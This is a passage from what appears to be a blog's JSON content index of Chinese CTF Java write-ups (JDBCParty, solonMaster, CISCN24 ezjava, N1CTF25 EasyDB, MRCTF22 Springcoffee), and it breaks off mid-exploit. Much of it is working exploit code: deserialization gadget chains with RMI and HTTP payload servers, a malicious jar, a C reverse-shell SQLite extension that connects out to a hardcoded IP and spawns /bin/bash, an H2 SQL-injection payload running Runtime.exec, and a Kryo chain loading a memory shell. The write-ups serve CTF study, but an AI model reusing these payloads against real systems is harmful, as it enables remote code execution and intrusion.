ObjectOutputStream.class.getDeclaredMethod(&quot;writeTypeString&quot;,String.class);                    writeTypeString.setAccessible(true);                    writeTypeString.invoke(this,f.getTypeString());//                    writeTypeString(f.getTypeString());                &#125;            &#125;        &#125; catch (NoSuchFieldException e) &#123;            throw new RuntimeException(e);        &#125; catch (IllegalAccessException e) &#123;            throw new RuntimeException(e);        &#125; catch (NoSuchMethodException e) &#123;            throw new RuntimeException(e);        &#125; catch (InvocationTargetException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static Object getFieldValue(Object object, String fieldName) throws            NoSuchFieldException, IllegalAccessException &#123;        Class&lt;?&gt; clazz = object.getClass();        Field field = clazz.getDeclaredField(fieldName);        field.setAccessible(true);        Object value = field.get(object);        return value;    &#125;&#125;","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"软件安全赛初赛25--JDBCParty","url":"/2025/05/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B%E5%88%9D%E8%B5%9B25-JDBCParty/","content":"依赖：\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;version&gt;3.5.5&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;    &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt;&lt;!-- https://mvnrepository.com/artifact/com.oracle.database.jdbc/ojdbc11 --&gt;&lt;dependency&gt;    &lt;groupId&gt;com.oracle.database.jdbc&lt;/groupId&gt;    &lt;artifactId&gt;ojdbc11&lt;/artifactId&gt;    &lt;version&gt;21.14.0.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;    &lt;artifactId&gt;tomcat-jdbc&lt;/artifactId&gt;    &lt;version&gt;10.1.31&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt;    &lt;artifactId&gt;batik-swing&lt;/artifactId&gt;    &lt;version&gt;1.14&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba.fastjson2&lt;/groupId&gt;    &lt;artifactId&gt;fastjson2&lt;/artifactId&gt;    &lt;version&gt;2.0.37&lt;/version&gt;&lt;/dependency&gt;\n\n一道jdk17的题先分析能利用的资源：\n\nspringboot自带的jackson链\nfastjson2的原生反序列化链\nspringboot里带的tomcat-embed-core，有BeanFactory，可以在JNDI的时候用。这里是10.1.31版本，那forceString用不了，但是还是可以触发setter\nojdbc，没见过。但是和数据库有关的，要么是直接jdbc，比如经典的mysql-jdbc，要么是打jndi。目前高版本jdk的题，如果是内存数据库喜欢考jdbc，如果不是内存数据库喜欢考jndi。等下可以注意一下里面是否有jndi注入点\nbatik-swing，没见过，且没思路。看了wp才知道是和jndi结合起来用，算高版本jndi之xxe利用吧。参考 JDK CVE-2023-21939 分析利用\n\n看一下题目的反序列化点：\n\n很直接，就是直接反序列化\n\n现在能够大概确定一个思路：1、EventListenerList+fastjson2&#x2F;jackson，触发getter2、某个getter触发jndi3、jndi结合batik-swing实现rce\nOracleCachedRowSet链现在尝试找一下有没有能触发jndi的getter，这里用tabby找：\n建议路径一开始别设置太长，先从短链找起。排除一些不能序列化，没有exports的类后，能够发现oracle.jdbc.rowset.OracleCachedRowSet#getConnection。具体看一下它调用的getConnectionInternal，能够发现是可用的，不过只有rmi协议可用，因为有个validateJNDIName()，里面不允许ldap。\n后面还不太清楚，先搬运一下。\n先起rmi服务器：\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;import org.apache.naming.ResourceRef;import javax.naming.StringRefAddr;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer &#123;    public static void main(String[] args) throws Exception &#123;        System.out.println(&quot;Creating evil RMI registry on port 1097&quot;);        Registry registry = LocateRegistry.createRegistry(1097);        ResourceRef ref = new ResourceRef(&quot;org.apache.batik.swing.JSVGCanvas&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);        ref.add(new StringRefAddr(&quot;URI&quot;, &quot;http://localhost:8886/1.xml&quot;));        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);        registry.bind(&quot;remoteobj&quot;, referenceWrapper); //Client处访问rmi://localhost:1097/remoteobj    &#125;&#125;\n\n再起xml服务器：\nimport com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.net.httpserver.HttpServer;import java.io.IOException;import java.io.OutputStream;import java.net.InetSocketAddress;public class XmlServer &#123;    public static void main(String[] args) throws IOException &#123;        HttpServer server = HttpServer.create(new InetSocketAddress(8886), 0);        server.createContext(&quot;/1.xml&quot;, new Xml1Handler());        server.createContext(&quot;/2.xml&quot;, new Xml2Handler());        server.setExecutor(null);        server.start();        System.out.println(&quot;Server started on port 8886&quot;);    &#125;    static class Xml1Handler implements HttpHandler &#123;        @Override        public void handle(HttpExchange exchange) throws IOException &#123;            exchange.getResponseHeaders().set(&quot;Content-Type&quot;, &quot;application/xml&quot;);            exchange.getResponseHeaders().set(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);            exchange.sendResponseHeaders(200, 0);            String xml = &quot;&lt;svg xmlns=\\&quot;http://www.w3.org/2000/svg\\&quot; &quot; +                    &quot;xmlns:xlink=\\&quot;http://www.w3.org/1999/xlink\\&quot; &quot; +                    &quot;version=\\&quot;1.0\\&quot;&gt; &lt;script type=\\&quot;application/java-archive\\&quot; &quot; +                    &quot;xlink:href=\\&quot;http://localhost:8887/exploit.jar\\&quot;/&gt; &quot; +                    &quot;&lt;text&gt;Static text ...&lt;/text&gt; &lt;/svg&gt;&quot;;            OutputStream responseBody = exchange.getResponseBody();            responseBody.write(xml.getBytes());            responseBody.close();        &#125;    &#125;    static class Xml2Handler implements HttpHandler &#123;        @Override        public void handle(HttpExchange exchange) throws IOException &#123;            exchange.getResponseHeaders().set(&quot;Content-Type&quot;, &quot;application/xml&quot;);            exchange.getResponseHeaders().set(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);            exchange.sendResponseHeaders(200, 0);            String xml = &quot;&lt;svg xmlns=\\&quot;http://www.w3.org/2000/svg\\&quot; width=\\&quot;100\\&quot; &quot; +                    &quot;height=\\&quot;100\\&quot;&gt; &lt;circle cx=\\&quot;50\\&quot; cy=\\&quot;50\\&quot; r=\\&quot;50\\&quot; fill=\\&quot;green\\&quot; &quot; +                    &quot;onload=\\&quot;showFrame()\\&quot;/&gt; &lt;script type=\\&quot;text/ecmascript\\&quot;&gt; &quot; +                    &quot;importPackage(Packages.java.lang); function showFrame() &#123; &quot; +                    &quot;Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;); &#125; &lt;/script&gt; &lt;/svg&gt;&quot;;            OutputStream responseBody = exchange.getResponseBody();            responseBody.write(xml.getBytes());            responseBody.close();        &#125;    &#125;&#125;\n\n再起http服务器：\n这个直接python -m http.server 8887 也一样\nimport com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.net.httpserver.HttpServer;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.InetSocketAddress;public class JarServer &#123;    public static void main(String[] args) throws IOException &#123;        HttpServer server = HttpServer.create(new InetSocketAddress(8887), 0);        server.createContext(&quot;/exploit.jar&quot;, new BinaryHandler());        server.setExecutor(null);        server.start();        System.out.println(&quot;Server started on port 8887&quot;);    &#125;    public static byte[] readInputStream(InputStream inputStream) &#123;        byte[] temp = new byte[4096];        int readOneNum = 0;        ByteArrayOutputStream bos = new ByteArrayOutputStream();        try &#123;            while ((readOneNum = inputStream.read(temp)) != -1) &#123;                bos.write(temp, 0, readOneNum);            &#125;            inputStream.close();        &#125; catch (Exception ignored) &#123;        &#125;        return bos.toByteArray();    &#125;    static class BinaryHandler implements HttpHandler &#123;        @Override        public void handle(HttpExchange exchange) throws IOException &#123;            System.out.println(&quot;get request&quot;);            byte[] data = readInputStream(JarServer.class.getClassLoader()                    .getResourceAsStream(&quot;exploit.jar&quot;));            exchange.getResponseHeaders().set(&quot;Content-Type&quot;, &quot;application/octet-stream&quot;);            exchange.getResponseHeaders().set(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);            exchange.sendResponseHeaders(200, data.length);            OutputStream responseBody = exchange.getResponseBody();            responseBody.write(data);            responseBody.close();        &#125;    &#125;&#125;\n\njar包里的内容：\nimport org.w3c.dom.events.Event;import org.w3c.dom.events.EventListener;import org.w3c.dom.svg.EventListenerInitializer;import org.w3c.dom.svg.SVGDocument;import org.w3c.dom.svg.SVGSVGElement;public class Exploit implements EventListenerInitializer &#123;    public Exploit() &#123;    &#125;    public void initializeEventListeners(SVGDocument document) &#123;        SVGSVGElement root = document.getRootElement();        EventListener listener = new EventListener() &#123;            public void handleEvent(Event event) &#123;                try &#123;                    Runtime.getRuntime().exec(&quot;calc.exe&quot;);                &#125; catch (Exception e) &#123;                &#125;            &#125;        &#125;;        root.addEventListener(&quot;SVGLoad&quot;, listener, false);    &#125;&#125;\n\n最终Pocpackage com.example.solution;import com.alibaba.fastjson2.JSONArray;import com.fasterxml.jackson.databind.node.POJONode;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import oracle.jdbc.rowset.OracleCachedRowSet;import javax.swing.event.EventListenerList;import java.io.FileOutputStream;import java.util.Base64;public class Poc &#123;    public static void main(String[] args) throws Exception &#123;//        Tools17.bypassModule(Poc.class);        OracleCachedRowSet oracleCachedRowSet = new OracleCachedRowSet();        oracleCachedRowSet.setDataSourceName(&quot;rmi://localhost:1097/remoteobj&quot;);        Object o = GadgetUtils17.makeObjectAopProxy(oracleCachedRowSet);        JSONArray jsonArray = new JSONArray();        jsonArray.add(o);        POJONode node = GadgetUtils17.JacksonToString2GetterBetter(oracleCachedRowSet);//        POJONode nodes = GadgetUtils17.JacksonToString2GetterBetter(oracleCachedRowSet);        EventListenerList list = GadgetUtils17.eventListenerList(jsonArray);        byte[] ser = Tools17.ser(list);        String s = Base64.getEncoder().encodeToString(ser);        new FileOutputStream(&quot;D://1tmp//payload.txt&quot;).write(s.getBytes());        Tools17.deser(ser);    &#125;&#125;\n\n\n\nLdapAttribute链这个方法我没试过，不过应该也可以\n可以看JDK17打Jackson+LdapAttruibute反序列化 | GSBP’s Blog\n参考https://github.com/Y4Sec-Team/CVE-2023-21939\n来自三道高版本JDK的JDBC连打combo - EddieMurphy’s blog\n软件攻防赛JDBCParty赛后解-先知社区\n高版本JNDI注入-高版本Tomcat利用方案-先知社区 这里有讲BeanFactory还能触发setter\n从2025系统安全防护赛JDBCParty学习高版本JDK和高版本Tomcat打JNDI到RCE | J1rrY’s Blog 这里具体讲了jar包怎么来\n探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 这里讲了高版本下jndi怎么打，有提到本题的xxe利用\nJDK CVE-2023-21939 分析利用batik-swing 组件造成的 rce 漏洞-先知社区 关于本题batik-swing怎么用\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"CISCN24决赛-solonMaster","url":"/2025/05/09/CISCN24%E5%86%B3%E8%B5%9B-solonMaster/","content":"前言考察原生fastjson链的引用绕过和toString链\n分析有fastjson83的依赖，很可能要用toString触发。\n看一下题目的几个主要类，首先是DemoController：\n反序列化的点很明显，主要是怎么绕。需要满足是User的子类，并且不能有BadAVE。\n那可以由EventListenerList—&gt;JSONArray.toString–&gt;getter\n再看User：\n这里有一个Map类，那就考虑从HashMap.readObject开始的反序列化。\n这里结合EXP的注释理解吧：主要理解为什么可以通过hashmap绕过\nimport com.alibaba.fastjson.JSONArray;import com.example.demo.User;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javax.management.BadAttributeValueExpException;import javax.swing.event.EventListenerList;import javax.swing.undo.UndoManager;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.*;public class EXP &#123;    public static void main(String[] args) throws Exception &#123;        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\tmp\\\\classes\\\\CalcAbs.class&quot;));        byte[][] codes = &#123;code&#125;;        TemplatesImpl templates = new TemplatesImpl();        setFieldValue(templates, &quot;_class&quot;, null);        setFieldValue(templates, &quot;_name&quot;, &quot;useless&quot;);        setFieldValue(templates, &quot;_tfactory&quot;,  new TransformerFactoryImpl());        setFieldValue(templates, &quot;_bytecodes&quot;, codes);//        ArrayList&lt;Object&gt; list = new ArrayList&lt;&gt;();//        list.add(templates);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        EventListenerList elist = new EventListenerList();        UndoManager manager = new UndoManager();        Vector vector = (Vector) getFieldValue(manager, &quot;edits&quot;);        vector.add(jsonArray);        setFieldValue(elist, &quot;listenerList&quot;, new Object[] &#123; Map.class, manager &#125;);        // 这里是为了绕fastjson自己的resolveClass，让其走TC_REFERENCE，就不会走它的resolveClass，也就不会触发autoType        //到时候先反序列化User里的Map类，就是HashMap。先反序列化键，就是templates。然后是elist，从而触发elist.readObject--&gt;toString        //由于templates已经在前面反序列化过，所以不会被fastjson的黑名单拦截        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(templates, elist);        User user = new User();        user.setInfo(hashMap);        byte[] serilize = serilize(user);        String s = Base64.getEncoder().encodeToString(serilize);        new FileOutputStream(new File(&quot;D:\\\\tmp\\\\payload.txt&quot;)).write(s.getBytes());//        deserialize(s);    &#125;    static Object deserialize(String data) throws Exception &#123;        return new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(data))) &#123; // from class: com.example.demo.DemoController.1            boolean check = false;            @Override // java.io.ObjectInputStream            protected Class resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;                Class targetc = super.resolveClass(desc);                if (!this.check &amp;&amp; !User.class.isAssignableFrom(targetc)) &#123;                    throw new IllegalArgumentException(&quot;HackerClass:&quot; + targetc);                &#125; else if (BadAttributeValueExpException.class.isAssignableFrom(targetc)) &#123;                    throw new IllegalArgumentException(&quot;HackerClass:&quot; + targetc);                &#125; else &#123;                    this.check = true;                    return targetc;                &#125;            &#125;        &#125;.readObject();    &#125;    public static byte[] serilize(Object obj) throws IOException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(obj);        oos.close();        return baos.toByteArray();    &#125;    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException, NoSuchFieldException &#123;        Field declaredField = obj.getClass().getDeclaredField(fieldName);        declaredField.setAccessible(true);        declaredField.set(obj, value);    &#125;    public static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException &#123;        Class&lt;?&gt; aClass = obj.getClass();        Field field =null;        while (aClass != null) &#123;            try &#123;                field = aClass.getDeclaredField(fieldName);                field.setAccessible(true);                return field.get(obj);            &#125; catch (NoSuchFieldException e) &#123;                aClass = aClass.getSuperclass();            &#125;        &#125;        return null;    &#125;&#125;\n\npython脚本：当时POST的数据格式还调了好久\nimport base64import requestsfrom urllib.parse import quoteif __name__ == &#x27;__main__&#x27;:    with open(&quot;D://tmp//payload.txt&quot;, &quot;r&quot;) as f:        # header = b&#x27;\\x63\\x02\\x00\\x48\\x00\\x04&#x27; + b&#x27;test&#x27;        payload = f.read()        # b64 = base64.b64encode(payload)    url = &quot;http://127.0.0.1:8004/api&quot;    json = &#123;        &quot;map&quot;: &#123;            &quot;data&quot;: f&quot;&#123;payload&#125;&quot;        &#125;,        &quot;a&quot;: &quot;a&quot;    &#125;    headers = &#123;        &quot;Content-Type&quot;: &quot;application/json&quot;    &#125;    res = requests.post(url, json=json, headers=headers)    print(res.text)    # print(b64)\n\n\n\n总结这里主要学高版本fastjson原生反序列化引用绕过的原理，toString链的话除了上面用到的EventListenerList，还有TextAndMnemonicHashMap等\n参考文章 - 高版本Fastjson反序列化Xtring新链和EventListenerList绕过 - 先知社区\n2024Ciscn总决赛Web Writeup - F12~ - 博客园\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"CISCN24_ezjava","url":"/2025/05/09/CISCN24-ezjava/","content":"前言考察sqliite加载so文件实现RCE。\n分析首先你需要知道，sqlite是一个内存数据库，直接存储在本地，没有server，client一说。一个sqlite数据库就是一个文件，类似test.db。你可以随机新建一个db文件，然后创建sqlite时打开，这样之后产生的数据都会写在这个db文件上。sqlite无法跟mysql一样返回反序列化数据，只能通过加载so文件实现RCE\n这题有两种解法，一是通过AspectJ写so文件，然后sql注入加载so文件；二是利用sqlite缓存数据库的特性，先让靶机获取so文件，并算出重命名后的so文件，然后再连接恶意db，实现加载so文件。\n方法1依赖里有AspectJ组件，又可以用JDBC mysql反序列化，那就可以任意写文件。那我们写一个so文件。\n#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;signal.h&gt;#include &lt;dirent.h&gt;#include &lt;sqlite3ext.h&gt;#include &lt;sys/stat.h&gt;SQLITE_EXTENSION_INIT1/* Configuration for the TCP connection */int tcp_port = 5555;char *ip = &quot;129.204.197.19&quot;;#ifdef _WIN32__declspec(dllexport)#endif/** * Initializes the SQLite extension. * * @param db SQLite database pointer * @param pzErrMsg Error message pointer * @param pApi SQLite API routines pointer * @return SQLITE_OK on success */int sqlite3_extension_init(    sqlite3 *db,    char **pzErrMsg,    const sqlite3_api_routines *pApi) &#123;    int rc = SQLITE_OK;    SQLITE_EXTENSION_INIT2(pApi);    /* Establish a TCP connection and spawn a shell if running in a child process */    int fd;    if ((fork()) &lt;= 0) &#123;        struct sockaddr_in addr;        addr.sin_family = AF_INET;        addr.sin_port = htons(tcp_port);        addr.sin_addr.s_addr = inet_addr(ip);        fd = socket(AF_INET, SOCK_STREAM, 0);        if (connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr)) != 0) &#123;            exit(0); // Exit if connection fails        &#125;        // Redirect standard file descriptors to the socket        dup2(fd, 0);        dup2(fd, 1);        dup2(fd, 2);        // Execute bash shell        execve(&quot;/bin/bash&quot;, NULL, NULL);    &#125;    return rc;&#125;\n\ngcc -g -fPIC -shared rce.c -o rce.so\n在linux环境下编译成so。\n这里假设写入&#x2F;tmp&#x2F;rce.so\n我们用navicat新建一个基于user.db(新建txt改后缀就行)的sqlite，然后在里面新建一张user表，两个字段。\nPOST请求选择type3，如果参数里有tableName，就会执行下面的语句：\n这里就可以注入。\n写完文件后这样发POST请求就行\n&#123;&quot;type&quot;:&quot;3&quot;,&quot;url&quot;:&quot;jdbc:sqlite::resource:http://10.195.247.79:7776/user.db&quot;,&quot;tableName&quot;:&quot;user union select 1,load_extension(&#x27;/tmp/rce.so&#x27;)&quot;&#125;\n\n至于url的格式为什么是这样的，去看org.sqlite.core.CoreConnection#open就知道了，这样写才能加载远程的db文件到本地。\n方法2假如我们不能任意写文件，我们仍可以加载so文件，因为sqlite有缓存机制。如果是从远程加载的db，那么该db从远程加载后，会保存到本地的一个特定路径，该路径可以计算，具体计算方法看org.sqlite.core.CoreConnection#extractResource\n下面是计算文件名的方法：\npackage solution;import java.net.MalformedURLException;import java.net.URL;public class hashName &#123;    public static void main(String[] args) throws MalformedURLException &#123;        URL resourceAddr = new URL(&quot;http://10.195.247.79:7776/rce.so&quot;);        String dbFileName = String.format(&quot;sqlite-jdbc-tmp-%d.db&quot;, resourceAddr.hashCode());        System.out.println(dbFileName);        //sqlite-jdbc-tmp--1989922468.db    &#125;&#125;\n\n其实就是hashCode一下我们的url。\n接着就是加载so文件了(实际上已经是sqlite-jdbc-tmp–1989922468.db)。除了方法1里面的sql注入，还可以用另一种方法。我们可以用navicat以exp.db为基础创建一个sqlite3数据库。之后执行\ncreate view security as select (select load_extension(&#x27;/tmp/sqlite-jdbc-tmp--1989922468.db&#x27;));\n\n这样会新建一个视图。\n当我们先传入so文件后，POST下面的即可\n&#123;&quot;type&quot;:&quot;3&quot;,&quot;url&quot;:&quot;jdbc:sqlite::resource:http://10.195.247.79:7776/exp.db&quot;,&quot;tableName&quot;:&quot;security&quot;&#125;\n\n实际上就是select * from security ，而security里面有我们创建的恶意视图，最终就是执行select load_extension(‘&#x2F;tmp&#x2F;sqlite-jdbc-tmp–1989922468.db’)\n总结这题主要学了一下sqlite实现rce，这也是第一次遇到sql到rce吧。\n参考CISCN2024 writeup（web部分）\nhttps://xz.aliyun.com/news/14234\n2024CISCN_WEB_ezjava题解 | P0l@R19ht\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"N1CTF25-EasyDB","url":"/2025/05/09/N1CTF25-EasyDB/","content":"记录一下踩坑\n1、executeQuery 可以执行 create\n一开始以为executeQuery 不能执行create 操作。但是后来发现是可以的，只需要在前面加一个select 语句就行。\nselect 1;CREATE ALIAS RT AS 。。。。\n\n2、SQL语句中，单引号和双引号的意义不一样\n最后CALL RT(‘calc’);时，一开始用的是双引号，但是双引号会报错：Column “calc” not found; SQL statement:\nCALL RT(“calc”);\n这是因为在 H2 SQL 中，字符串字面量通常使用单引号（’）来包围。双引号（”）在 SQL 中通常用于标识标识符，如表名、列名等。因此，当你在 CALL RT(“calc”) 中使用双引号时，SQL 解释器会将其解释为一个标识符（例如列名），而不是字符串字面量，从而导致错误。\n其他数据库也有这种特性，之后要注意。\n3、h2sql 的注释符只有 – \n一开始用的是#，一直报错。后面查了一下发现没有 #。这点跟mysql 不一样。\n这里主要考察的其实是黑名单绕过，用的是Java的字符串拼接。一开始想到其他编码方式绕过，其实不用这么麻烦。以后应该先考虑这种拼接绕过。\n总结一下，基于字符串的过滤，可以通过：拼接，编码，运算(异或、取反)等方法绕过。\n最终post参数：\naa&#x27;;CREATE ALIAS RT AS $$ void rt(String cmd) throws java.lang.Exception &#123;java.lang.Class&lt;?&gt; run = java.lang.Class.forName(&quot;java.lang.Run&quot; + &quot;time&quot;);java.lang.reflect.Method getr = run.getMethod(&quot;getRun&quot;+&quot;time&quot;);java.lang.reflect.Method ex = run.getMethod(&quot;exe&quot; + &quot;c&quot;, String.class);ex.invoke(getr.invoke(null), &quot;calc&quot;);&#125;$$;CALL RT(&#x27;calc&#x27;);--\n\n\n\nusername=aa%27%3BCREATE%20ALIAS%20RT%20AS%20%24%24%20void%20rt%28String%20cmd%29%20throws%20java.lang.Exception%20%7Bjava.lang.Class%3C%3F%3E%20run%20%3D%20java.lang.Class.forName%28%22java.lang.Run%22%20%2B%20%22time%22%29%3Bjava.lang.reflect.Method%20getr%20%3D%20run.getMethod%28%22getRun%22%2B%22time%22%29%3Bjava.lang.reflect.Method%20ex%20%3D%20run.getMethod%28%22exe%22%20%2B%20%22c%22%2C%20String.class%29%3Bex.invoke%28getr.invoke%28null%29%2C%20%22calc%22%29%3B%7D%24%24%3BCALL%20RT%28%27calc%27%29%3B--&amp;password=123","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"suctf25-sujava","url":"/2025/05/09/suctf25-sujava/","content":"主要考察JDBC mysql\n这里主要学到一种新的连接语法\njdbc:mysql:&#x2F;&#x2F;address&#x3D;(host&#x3D;myhost)(port&#x3D;1111)(key1&#x3D;value1)&#x2F;db#\n结合URL编码，这样可以绕过更多。\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"MRCTF22 Springcoffee","url":"/2025/05/09/MRCTF22-Springcoffee/","content":"前言高版本kyro反序列化，二次反序列化绕transit属性，controller内存马注入，rasp绕过（forkAndExec绕过）\n这题考的东西很多，而且很复杂，当时复现花了两天才搞好，不过也是学到了很多东西\n分析组件自己看吧，很容易确定是kyro入口。依赖里也用rometools，那么就可以考虑ROME链，也就是toString–&gt;getter。rasp是注入内存马读文件后才发现的，后面在分析\n高版本kryo绕过这里kyro是5.3.0版本的，之前在ciscn23里考过一道seaclouds，那里面的kryo是4.x.x版本的。这两个版本有一些不同，下面分析。\nkyro跟hessian一样，都是基于field机制的。一般入口点可以是HashMap#hashcode，因为里面反序列化HashMap类型数据的时候会调用put还原，而put的时候一定会用hashcode检查键是否重复。另外，也可以从equals入手，那就可以走HotSwap那条，最终也是可以触发toString\n不过kryo4直接序列化就行，kryo5里面却加了一些限制。下面参照Y4的文章2022MRCTF-Java部分，开始分析\n首先这里链子是比较简单的，要注意的就是需要有二次反序列化，因为kyro不能序列化transit的属性，而TemplatesImpl的_tfactory就是transit属性。\n大致链子如下：\nHashMap#putVal#equalsHotSwappableTargetSource#equalsXString#equalsToStringBean#toStringSignedObject#getObjectHashMap#readObjectHashMap#hashEqualsBean#hashCodeToStringBean#toStringTemplateImpl#getter\n\n当然，前半段用ROME链触发也可以。\n先不放阶段性EXP了，强烈建议先去后面看完整的，把讲到的部分看了就行，后面也是这样。这里如果构造好EXP去测试的话是会报错的：\n说是HashMap的Class没注册。这里我们回去看一下Controller里的逻辑是怎么写的：\n\n两个路由，第一个很明显是反序列化的，那第二个是用来干什么的呢？简单分析可以知道，它是用来调用kryo里的任意setter方法的。解决报错的关键就在于调用什么setter方法，传入什么参数。我们知道，kryo反序列化的关键就是调用com.esotericsoftware.kryo.serializers.MapSerializer进行反序列化。\n知道上面这些后，我们再去定位到报错的位置：\n报错在这里，那我们调整这个值为false是不是就可以了呢？正好又有对应的set方法，去尝试一下，发现确实可以。此时它会执行com.esotericsoftware.kryo.util.DefaultClassResolver#registerImplicit&#x3D;&gt;com.esotericsoftware.kryo.Kryo#getDefaultSerializer最终获取到我们需要的com.esotericsoftware.kryo.serializers.MapSerializer\n不过出现了新的报错：意思是反序列化的类需要有无参构造\n这个报错怎么解决我不太能讲清楚，这里直接给\n&quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;\n\n可以去看Y4的文章，写的比较清楚\n最终的payload：\n&quot;polish&quot;: True,&quot;References&quot;: True,&quot;RegistrationRequired&quot;: False,&quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;\n\n这里还多出来一个References，这个很多文章里没写，但是必须要加，我从官方EXP里面看到的。但是具体原因不知道，如果有人知道了可以给我留言。\nkryo反序列化到此为止，EXP：\nimport com.esotericsoftware.kryo.Kryo;import com.esotericsoftware.kryo.io.Input;import com.esotericsoftware.kryo.io.Output;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ObjectBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.compiler.Template;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import fun.mrctf.springcoffee.model.ExtraFlavor;import javassist.ClassPool;import org.json.JSONObject;import org.springframework.aop.target.HotSwappableTargetSource;import tools.Evil;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.FileOutputStream;import java.io.IOException;import java.lang.reflect.Array;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;import java.util.HashMap;public class KryoSer &#123;    protected Kryo kryo = new Kryo();    public String ser(String raw) throws Exception &#123;        JSONObject serializeConfig = new JSONObject(raw);        if (serializeConfig.has(&quot;polish&quot;) &amp;&amp; serializeConfig.getBoolean(&quot;polish&quot;)) &#123;            this.kryo = new Kryo();            for (Method setMethod : this.kryo.getClass().getDeclaredMethods()) &#123;                if (setMethod.getName().startsWith(&quot;set&quot;)) &#123;                    try &#123;                        Object p1 = serializeConfig.get(setMethod.getName().substring(3));                        if (!setMethod.getParameterTypes()[0].isPrimitive()) &#123;                            try &#123;                                setMethod.invoke(this.kryo, Class.forName((String) p1).newInstance());                            &#125; catch (Exception e) &#123;                                e.printStackTrace();                            &#125;                        &#125; else &#123;                            setMethod.invoke(this.kryo, p1);                        &#125;                    &#125; catch (Exception e2) &#123;                    &#125;                &#125;            &#125;        &#125;        byte[] bytecode = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();        TemplatesImpl templates = new TemplatesImpl();        setFieldValue(templates, &quot;_class&quot;, null);        setFieldValue(templates, &quot;_name&quot;, &quot;1diOt9&quot;);        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());        byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\java-challenges\\\\MRCTF\\\\MRCTF2022\\\\springcoffee\\\\target\\\\classes\\\\memshell\\\\SpringBootController_Higher2_6_0.class&quot;));        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;bytes&#125;);        ToStringBean toStringBean1 = new ToStringBean(Templates.class, templates);        //防止在put时触发        EqualsBean equalsBean1 = new EqualsBean(String.class, &quot;any&quot;);        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();        hashMap1.put(equalsBean1, &quot;any&quot;);        setFieldValue(equalsBean1, &quot;obj&quot;, toStringBean1);        setFieldValue(equalsBean1, &quot;beanClass&quot;, ToStringBean.class);        //固定写法，初始化SignedObject        KeyPairGenerator keyPairGenerator;        